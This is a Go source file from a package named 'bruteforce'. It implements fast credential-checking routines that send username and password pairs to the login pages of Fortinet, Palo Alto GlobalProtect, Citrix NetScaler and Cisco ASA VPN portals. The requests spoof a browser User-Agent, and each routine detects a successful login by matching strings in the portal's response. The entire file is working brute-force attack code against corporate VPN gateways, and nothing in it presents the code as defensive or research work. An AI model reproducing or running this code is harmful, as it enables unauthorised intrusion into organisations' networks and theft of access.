package bruteforce

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"unsafe"
)

// Ultra-fast string to bytes conversion without allocation
func stringToBytes(s string) []byte {
	return *(*[]byte)(unsafe.Pointer(&struct {
		string
		Cap int
	}{s, len(s)}))
}

// Ultra-fast bytes to string conversion without allocation
func bytesToString(b []byte) string {
	return *(*string)(unsafe.Pointer(&b))
}

func (e *Engine) checkFortinetUltraFast(ctx context.Context, cred Credential, resp *Response, buf []byte) (bool, error) {
	targetURL := fmt.Sprintf("https://%s/remote/login", cred.IP)
	
	// Pre-build form data as bytes to avoid string allocations
	formData := fmt.Sprintf("username=%s&password=%s", 
		url.QueryEscape(cred.Username), 
		url.QueryEscape(cred.Password))
	
	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, 
		bytes.NewReader(stringToBytes(formData)))
	if err != nil {
		return false, err
	}

	// Set headers efficiently
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Connection", "close")
	req.Close = true

	httpResp, err := e.client.Do(req)
	if err != nil {
		return false, err
	}
	defer httpResp.Body.Close()

	// Read response with pre-allocated buffer
	n, err := io.ReadFull(httpResp.Body, buf[:min(len(buf), 4096)])
	if err != nil && err != io.ErrUnexpectedEOF && err != io.EOF {
		return false, err
	}
	
	bodyStr := bytesToString(buf[:n])
	
	// Store response data
	resp.StatusCode = httpResp.StatusCode
	resp.Body = append(resp.Body[:0], buf[:n]...)
	
	// Multiple success indicators for Fortinet
	return httpResp.StatusCode == 200 && (
		strings.Contains(bodyStr, "vpn/tunnel") ||
		strings.Contains(bodyStr, "/remote/fortisslvpn") ||
		strings.Contains(bodyStr, "tunnel_mode") ||
		strings.Contains(bodyStr, "sslvpn_login") ||
		strings.Contains(bodyStr, "forticlient_download") ||
		strings.Contains(bodyStr, "portal.html") ||
		strings.Contains(bodyStr, "welcome.html")), nil
}

func (e *Engine) checkGlobalProtectUltraFast(ctx context.Context, cred Credential, resp *Response, buf []byte) (bool, error) {
	targetURL := fmt.Sprintf("https://%s/global-protect/login.esp", cred.IP)
	
	formData := fmt.Sprintf("prot=https%%&server=%s&inputStr=&action=getsoftware&user=%s&passwd=%s&ok=Log+In",
		url.QueryEscape(cred.IP),
		url.QueryEscape(cred.Username), 
		url.QueryEscape(cred.Password))

	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, 
		bytes.NewReader(stringToBytes(formData)))
	if err != nil {
		return false, err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Connection", "close")
	req.Close = true

	httpResp, err := e.client.Do(req)
	if err != nil {
		return false, err
	}
	defer httpResp.Body.Close()

	n, err := io.ReadFull(httpResp.Body, buf[:min(len(buf), 4096)])
	if err != nil && err != io.ErrUnexpectedEOF && err != io.EOF {
		return false, err
	}
	
	bodyStr := bytesToString(buf[:n])
	resp.StatusCode = httpResp.StatusCode
	resp.Body = append(resp.Body[:0], buf[:n]...)

	// Multiple success indicators for GlobalProtect
	return httpResp.StatusCode == 200 && (
		strings.Contains(bodyStr, "Download Windows 64 bit GlobalProtect agent") ||
		strings.Contains(bodyStr, "globalprotect/portal/css") ||
		strings.Contains(bodyStr, "portal-userauthcookie") ||
		strings.Contains(bodyStr, "GlobalProtect Portal") ||
		strings.Contains(bodyStr, "gp-portal") ||
		strings.Contains(bodyStr, "/global-protect/portal")), nil
}

func (e *Engine) checkCitrixUltraFast(ctx context.Context, cred Credential, resp *Response, buf []byte) (bool, error) {
	targetURL := fmt.Sprintf("https://%s/p/u/doAuthentication.do", cred.IP)
	
	formData := fmt.Sprintf("login=%s&passwd=%s&savecredentials=false&nsg-x1-logon-button=Log+On&StateContext=bG9naW5zY2hlbWE9ZGVmYXVsdA%%3D%%3D",
		url.QueryEscape(cred.Username), 
		url.QueryEscape(cred.Password))

	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, 
		bytes.NewReader(stringToBytes(formData)))
	if err != nil {
		return false, err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Connection", "close")
	req.Close = true

	httpResp, err := e.client.Do(req)
	if err != nil {
		return false, err
	}
	defer httpResp.Body.Close()

	n, err := io.ReadFull(httpResp.Body, buf[:min(len(buf), 4096)])
	if err != nil && err != io.ErrUnexpectedEOF && err != io.EOF {
		return false, err
	}
	
	bodyStr := bytesToString(buf[:n])
	resp.StatusCode = httpResp.StatusCode
	resp.Body = append(resp.Body[:0], buf[:n]...)

	// Multiple success indicators for Citrix
	return httpResp.StatusCode == 200 && (
		strings.Contains(bodyStr, "<CredentialUpdateService>/p/a/getCredentialUpdateRequirements.do</CredentialUpdateService>") ||
		strings.Contains(bodyStr, "NetScaler Gateway") ||
		strings.Contains(bodyStr, "/vpn/index.html") ||
		strings.Contains(bodyStr, "citrix-logon") ||
		strings.Contains(bodyStr, "/logon/LogonPoint/") ||
		strings.Contains(bodyStr, "NSGateway")), nil
}

func (e *Engine) checkCiscoUltraFast(ctx context.Context, cred Credential, resp *Response, buf []byte) (bool, error) {
	targetURL := fmt.Sprintf("https://%s/+webvpn+/index.html", cred.IP)
	
	formData := fmt.Sprintf("username=%s&password=%s&group_list=&Login=Logon",
		url.QueryEscape(cred.Username), 
		url.QueryEscape(cred.Password))

	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, 
		bytes.NewReader(stringToBytes(formData)))
	if err != nil {
		return false, err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Connection", "close")
	req.Close = true

	httpResp, err := e.client.Do(req)
	if err != nil {
		return false, err
	}
	defer httpResp.Body.Close()

	n, err := io.ReadFull(httpResp.Body, buf[:min(len(buf), 4096)])
	if err != nil && err != io.ErrUnexpectedEOF && err != io.EOF {
		return false, err
	}
	
	bodyStr := bytesToString(buf[:n])
	resp.StatusCode = httpResp.StatusCode
	resp.Body = append(resp.Body[:0], buf[:n]...)

	// Multiple success indicators for Cisco ASA
	return httpResp.StatusCode == 200 && (
		strings.Contains(bodyStr, "SSL VPN Service") && strings.Contains(bodyStr, "webvpn_logout") ||
		strings.Contains(bodyStr, "/+CSCOE+/") ||
		strings.Contains(bodyStr, "webvpn_portal") ||
		strings.Contains(bodyStr, "Cisco Systems VPN Client") ||
		strings.Contains(bodyStr, "/+webvpn+/") ||
		strings.Contains(bodyStr, "anyconnect")), nil
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}